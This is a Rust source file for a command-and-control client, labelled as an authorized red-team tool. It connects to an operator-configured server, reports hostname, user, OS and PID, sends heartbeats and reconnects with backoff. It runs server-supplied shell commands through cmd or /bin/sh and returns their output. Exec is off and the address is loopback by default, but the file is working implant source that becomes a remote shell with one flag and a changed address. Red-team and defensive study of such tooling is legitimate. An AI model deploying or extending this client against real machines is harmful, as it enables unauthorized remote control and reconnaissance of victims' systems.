//! c2client — M0 loopback slice of the authorized red-team C2 v2 client.
//!
//! Scope: this binary only talks to an operator-configured server address
//! (default 127.0.0.1:9909 for local lab use). It is part of an authorized
//! red-team engagement; see docs/AUTHORIZED_USE.md.
//!
//! M0 capabilities: connect + hello, heartbeat, handle `sysinfo` / `ping` /
//! `exec` tasks. `exec` is disabled unless `--allow-exec` is passed.

mod crypto;
mod proto;

use proto::{object, JVal, Msg};
use std::io::{BufReader, Write};
use std::net::TcpStream;
use std::process::Command;
use std::sync::atomic::{AtomicBool, Ordering};
use std::sync::{Arc, Mutex};
use std::thread;
use std::time::Duration;

#[derive(Debug, Clone)]
struct Config {
    addr: String,
    client_id: String,
    interval_secs: u64,
    suite: String,
    allow_exec: bool,
    once: bool,
    retries: u32,
}

impl Default for Config {
    fn default() -> Self {
        Config {
            addr: "127.0.0.1:9909".to_string(),
            client_id: String::new(),
            interval_secs: 20,
            suite: "plaintext".to_string(),
            allow_exec: false,
            once: false,
            retries: 5,
        }
    }
}

fn usage() -> ! {
    eprintln!(
        "c2client 0.1.0 (M0) — usage:\n\
         \x20 c2client [--addr HOST:PORT] [--client-id ID] [--profile FILE]\n\
         \x20          [--interval SECS] [--suite plaintext|v2] [--allow-exec]\n\
         \x20          [--once] [--retries N]\n\
         \n\
         Environment fallbacks: C2_CLIENT_ADDR, C2_CLIENT_ID, C2_CLIENT_INTERVAL,\n\
         C2_CLIENT_SUITE, C2_ALLOW_EXEC=1, C2_PROFILE.\n\
         Profile format: flat `key=value` lines, keys: addr, client_id, interval,\n\
         suite, allow_exec, retries. See profiles/example-client.conf."
    );
    std::process::exit(2)
}

fn apply_profile(cfg: &mut Config, path: &str) -> Result<(), String> {
    let text = std::fs::read_to_string(path).map_err(|e| format!("profile {path}: {e}"))?;
    for (lineno, line) in text.lines().enumerate() {
        let line = line.trim();
        if line.is_empty() || line.starts_with('#') || line.starts_with(';') {
            continue;
        }
        let (k, v) = line
            .split_once('=')
            .ok_or_else(|| format!("{path}:{}: expected key=value", lineno + 1))?;
        let (k, v) = (k.trim(), v.trim().trim_matches('"'));
        match k {
            "addr" => cfg.addr = v.to_string(),
            "client_id" => cfg.client_id = v.to_string(),
            "interval" => {
                cfg.interval_secs = v
                    .parse()
                    .map_err(|_| format!("{path}:{}: bad interval", lineno + 1))?
            }
            "suite" => cfg.suite = v.to_string(),
            "allow_exec" => cfg.allow_exec = matches!(v, "1" | "true" | "yes"),
            "retries" => {
                cfg.retries = v
                    .parse()
                    .map_err(|_| format!("{path}:{}: bad retries", lineno + 1))?
            }
            _ => eprintln!("[client] ignoring unknown profile key: {k}"),
        }
    }
    Ok(())
}

fn parse_args() -> Config {
    let mut cfg = Config::default();
    // Precedence: profile < env < CLI flags.
    let mut profile = std::env::var("C2_PROFILE").ok();
    let argv: Vec<String> = std::env::args().skip(1).collect();
    let mut i = 0;
    let mut set_allow_exec = false;
    while i < argv.len() {
        let a = argv[i].as_str();
        let next = |i: &mut usize| -> String {
            *i += 1;
            argv.get(*i).cloned().unwrap_or_else(|| usage())
        };
        match a {
            "--addr" => cfg.addr = next(&mut i),
            "--client-id" => cfg.client_id = next(&mut i),
            "--profile" => profile = Some(next(&mut i)),
            "--interval" => cfg.interval_secs = next(&mut i).parse().unwrap_or_else(|_| usage()),
            "--suite" => cfg.suite = next(&mut i),
            "--allow-exec" => set_allow_exec = true,
            "--once" => cfg.once = true,
            "--retries" => cfg.retries = next(&mut i).parse().unwrap_or_else(|_| usage()),
            "-h" | "--help" => usage(),
            other => {
                eprintln!("unknown argument: {other}");
                usage()
            }
        }
        i += 1;
    }
    if let Some(p) = profile {
        if let Err(e) = apply_profile(&mut cfg, &p) {
            eprintln!("[client] {e}");
            std::process::exit(2);
        }
    }
    if let Ok(v) = std::env::var("C2_CLIENT_ADDR") {
        cfg.addr = v;
    }
    if let Ok(v) = std::env::var("C2_CLIENT_ID") {
        cfg.client_id = v;
    }
    if let Ok(v) = std::env::var("C2_CLIENT_INTERVAL") {
        if let Ok(n) = v.parse() {
            cfg.interval_secs = n;
        }
    }
    if let Ok(v) = std::env::var("C2_CLIENT_SUITE") {
        cfg.suite = v;
    }
    if set_allow_exec || std::env::var("C2_ALLOW_EXEC").ok().as_deref() == Some("1") {
        cfg.allow_exec = true;
    }
    if cfg.client_id.is_empty() {
        let host = hostname();
        cfg.client_id = format!("{host}-{}", std::process::id());
    }
    cfg
}

fn hostname() -> String {
    for k in ["COMPUTERNAME", "HOSTNAME"] {
        if let Ok(v) = std::env::var(k) {
            if !v.is_empty() {
                return v;
            }
        }
    }
    "unknown".to_string()
}

fn username() -> String {
    for k in ["USERNAME", "USER"] {
        if let Ok(v) = std::env::var(k) {
            if !v.is_empty() {
                return v;
            }
        }
    }
    "unknown".to_string()
}

fn main() {
    let cfg = parse_args();
    match crypto::new_cipher(if cfg.suite == "v2" {
        crypto::Suite::V2
    } else {
        crypto::Suite::Plaintext
    }) {
        Ok(_) => {}
        Err(e) => {
            eprintln!("[client] suite {} unavailable: {e}", cfg.suite);
            std::process::exit(3);
        }
    }
    let cipher: Arc<Mutex<Box<dyn crypto::SessionCipher>>> = Arc::new(Mutex::new(
        crypto::new_cipher(if cfg.suite == "v2" {
            crypto::Suite::V2
        } else {
            crypto::Suite::Plaintext
        })
        .unwrap_or_else(|_| Box::new(crypto::Plaintext)),
    ));
    let mut attempt = 0u32;
    loop {
        attempt += 1;
        eprintln!(
            "[client] connecting to {} as {} (suite={}, try {})",
            cfg.addr, cfg.client_id, cfg.suite, attempt
        );
        match TcpStream::connect(&cfg.addr) {
            Ok(stream) => {
                attempt = 0;
                if let Err(e) = run_session(stream, &cfg, cipher.clone()) {
                    eprintln!("[client] session ended: {e}");
                }
                if cfg.once {
                    return;
                }
            }
            Err(e) => eprintln!("[client] connect failed: {e}"),
        }
        if cfg.retries != 0 && attempt >= cfg.retries {
            eprintln!("[client] giving up after {attempt} attempts");
            std::process::exit(1);
        }
        let backoff = std::cmp::min(1u64 << std::cmp::min(attempt, 4), 15);
        thread::sleep(Duration::from_secs(backoff));
    }
}

fn run_session(
    stream: TcpStream,
    cfg: &Config,
    cipher: Arc<Mutex<Box<dyn crypto::SessionCipher>>>,
) -> std::io::Result<()> {
    stream.set_nodelay(true).ok();
    let write_half = stream.try_clone()?;
    let writer: Arc<Mutex<Box<dyn Write + Send>>> = Arc::new(Mutex::new(Box::new(write_half)));
    let alive = Arc::new(AtomicBool::new(true));

    let hello = object(&[
        ("t", JVal::Str("hello".into())),
        ("client_id", JVal::Str(cfg.client_id.clone())),
        ("hostname", JVal::Str(hostname())),
        ("os", JVal::Str(std::env::consts::OS.into())),
        ("arch", JVal::Str(std::env::consts::ARCH.into())),
        ("pid", JVal::Num(std::process::id() as i64)),
        ("user", JVal::Str(username())),
        ("suite", JVal::Str(cfg.suite.clone())),
        ("version", JVal::Str(env!("CARGO_PKG_VERSION").into())),
    ]);
    send(&writer, &cipher, hello.as_bytes())?;
    eprintln!("[client] hello sent");

    if cfg.interval_secs > 0 {
        let w = writer.clone();
        let c = cipher.clone();
        let flag = alive.clone();
        let secs = cfg.interval_secs;
        thread::spawn(move || {
            while flag.load(Ordering::Relaxed) {
                thread::sleep(Duration::from_secs(secs));
                if !flag.load(Ordering::Relaxed) {
                    break;
                }
                let hb = object(&[
                    ("t", JVal::Str("heartbeat".into())),
                    ("ts", JVal::Num(now_ts())),
                ]);
                if send(&w, &c, hb.as_bytes()).is_err() {
                    break;
                }
            }
        });
    }

    let mut reader = BufReader::new(stream);
    loop {
        let frame = match proto::read_frame(&mut reader) {
            Ok(f) => f,
            Err(e) => {
                alive.store(false, Ordering::Relaxed);
                return Err(e);
            }
        };
        let plain = match cipher.lock().unwrap().open(b"frame", &frame) {
            Ok(p) => p,
            Err(e) => {
                eprintln!("[client] frame decrypt failed: {e}");
                continue;
            }
        };
        let text = String::from_utf8_lossy(&plain).to_string();
        let msg = match Msg::parse(&text) {
            Ok(m) => m,
            Err(e) => {
                eprintln!("[client] bad frame: {e}: {text}");
                continue;
            }
        };
        match msg.kind() {
            "hello_ack" => {
                eprintln!(
                    "[client] registered session_id={} interval={}",
                    msg.s("session_id"),
                    msg.n("interval")
                );
            }
            "task" => {
                let task_id = msg.s("task_id").to_string();
                let kind = msg.s("kind").to_string();
                let (ok, data, err) = execute_task(&kind, msg.s("arg"), cfg);
                let data_val = if data.is_empty() {
                    JVal::Null
                } else {
                    JVal::Str(data)
                };
                let resp = object(&[
                    ("t", JVal::Str("result".into())),
                    ("task_id", JVal::Str(task_id)),
                    ("kind", JVal::Str(kind)),
                    ("ok", JVal::Bool(ok)),
                    ("data", data_val),
                    ("err", JVal::Str(err)),
                ]);
                send(&writer, &cipher, resp.as_bytes())?;
            }
            "ping" => {
                let pong = object(&[
                    ("t", JVal::Str("pong".into())),
                    ("ts", JVal::Num(now_ts())),
                ]);
                send(&writer, &cipher, pong.as_bytes())?;
            }
            "shutdown" => {
                eprintln!("[client] server requested shutdown");
                alive.store(false, Ordering::Relaxed);
                return Ok(());
            }
            other => eprintln!("[client] ignoring frame type {other}"),
        }
    }
}

fn send(
    w: &Arc<Mutex<Box<dyn Write + Send>>>,
    c: &Arc<Mutex<Box<dyn crypto::SessionCipher>>>,
    payload: &[u8],
) -> std::io::Result<()> {
    let sealed = c
        .lock()
        .unwrap()
        .seal(b"frame", payload)
        .map_err(|e| std::io::Error::new(std::io::ErrorKind::Other, e.to_string()))?;
    let mut g = w.lock().unwrap();
    proto::write_frame(&mut *g, &sealed)
}

fn now_ts() -> i64 {
    std::time::SystemTime::now()
        .duration_since(std::time::UNIX_EPOCH)
        .map(|d| d.as_secs() as i64)
        .unwrap_or(0)
}

fn execute_task(kind: &str, arg: &str, cfg: &Config) -> (bool, String, String) {
    match kind {
        "sysinfo" => (true, sysinfo(), String::new()),
        "ping" => (true, "pong".to_string(), String::new()),
        "exec" => {
            if !cfg.allow_exec {
                return (
                    false,
                    String::new(),
                    "exec disabled on client (start with --allow-exec or C2_ALLOW_EXEC=1)".into(),
                );
            }
            if arg.is_empty() {
                return (false, String::new(), "empty command".into());
            }
            run_shell(arg)
        }
        other => (false, String::new(), format!("unknown task kind: {other}")),
    }
}

fn run_shell(cmd: &str) -> (bool, String, String) {
    let out = if cfg!(windows) {
        Command::new("cmd").args(["/C", cmd]).output()
    } else {
        Command::new("/bin/sh").args(["-c", cmd]).output()
    };
    match out {
        Ok(o) => {
            let mut text = String::from_utf8_lossy(&o.stdout).to_string();
            let err = String::from_utf8_lossy(&o.stderr).to_string();
            if !err.is_empty() {
                text.push_str("\n[stderr]\n");
                text.push_str(&err);
            }
            (o.status.success(), text, String::new())
        }
        Err(e) => (false, String::new(), format!("spawn failed: {e}")),
    }
}

fn sysinfo() -> String {
    let os = std::env::consts::OS;
    let arch = std::env::consts::ARCH;
    let family = std::env::consts::FAMILY;
    let mut lines = vec![
        format!("hostname={}", hostname()),
        format!("user={}", username()),
        format!("os={os}"),
        format!("arch={arch}"),
        format!("family={family}"),
        format!("pid={}", std::process::id()),
        format!("client_version={}", env!("CARGO_PKG_VERSION")),
    ];
    if cfg!(windows) {
        if let Ok(v) = std::env::var("PROCESSOR_ARCHITECTURE") {
            lines.push(format!("processor_arch={v}"));
        }
    } else if let Ok(v) = std::fs::read_to_string("/proc/sys/kernel/osrelease") {
        lines.push(format!("kernel={}", v.trim()));
    }
    lines.join(";")
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn config_defaults_are_loopback() {
        let c = Config::default();
        assert_eq!(c.addr, "127.0.0.1:9909");
        assert!(!c.allow_exec);
    }

    #[test]
    fn exec_task_is_disabled_by_default() {
        let c = Config::default();
        let (ok, _, err) = execute_task("exec", "echo hi", &c);
        assert!(!ok);
        assert!(err.contains("disabled"));
    }

    #[test]
    fn sysinfo_task_works() {
        let c = Config::default();
        let (ok, data, _) = execute_task("sysinfo", "", &c);
        assert!(ok);
        assert!(data.contains("os="));
    }
}
